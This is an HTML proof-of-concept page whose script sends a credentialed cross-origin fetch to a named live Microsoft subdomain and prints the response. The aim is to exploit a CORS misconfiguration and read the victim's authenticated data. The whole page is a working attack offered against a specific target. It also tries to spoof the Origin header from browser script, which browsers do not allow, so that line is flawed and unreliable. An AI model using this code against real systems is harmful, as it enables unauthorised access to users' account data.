<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Misconfiguration PoC</title>
</head>
<body>
    <h1>Proof of Concept: Exploiting CORS Misconfiguration</h1>
    <button id="exploit">Send Exploit Request</button>
    <pre id="result">Click the button to execute the PoC.</pre>
    
    <script>
        document.getElementById('exploit').addEventListener('click', async () => {
            const targetUrl = 'https://activelearning.int.cloud.microsoft.com'; // Target URL
            const maliciousOrigin = 'https://hackbit.org'; // Replace with an attacker-controlled domain

            // Create a malicious request to test the CORS misconfiguration
            try {
                const response = await fetch(targetUrl, {
                    method: 'GET',
                    credentials: 'include', // Include cookies or credentials
                    headers: {
                        'Origin': maliciousOrigin
                    }
                });

                // Try parsing the response as text
                const text = await response.text();
                document.getElementById('result').textContent = `Response from server:\n\n${text}`;
            } catch (error) {
                document.getElementById('result').textContent = `Error: ${error.message}`;
            }
        });
    </script>
</body>
</html>
